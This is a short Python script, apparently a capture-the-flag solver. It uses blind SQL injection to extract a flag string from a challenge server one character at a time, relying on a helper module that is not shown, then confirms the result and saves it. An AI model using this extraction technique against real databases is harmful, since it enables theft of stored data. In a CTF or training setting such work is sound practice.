"""Extract the flag string itself. Usage: python getflag.py <table> <column>

Floor cost is ~log2(|FLAGSET|) queries per character; the server adds several seconds
per request, so this is a long background run. The result is confirmed by ONE
whole-string equality query, which is what makes the retry budget safe.
"""
import sys
import time
import solve

tbl, col = sys.argv[1], sys.argv[2]
EXPR = "(SELECT %s FROM %s WHERE %s LIKE '%%sun%%' LIMIT 1)" % (col, tbl, col)

t0 = time.time()
print("[*] target expression: %s" % EXPR, flush=True)
n = solve.get_int("length((%s))" % EXPR, 0, 80)
print("[*] length = %d" % n, flush=True)
val = solve.get_str(EXPR, cands=solve.FLAGSET, n=n, echo=sys.stdout)
print("\n[*] got %r after %d queries / %.0fs" % (val, solve.Q["n"], time.time() - t0), flush=True)

ok = solve.bit("(%s) = '%s'" % (EXPR, val.replace("'", "''")))
print("[+] whole-string verification query says: %s" % ok, flush=True)
if ok:
    open("../flag.txt", "w").write(val + "\n")
    print("[flag] " + val)
sys.exit(0 if ok else 1)
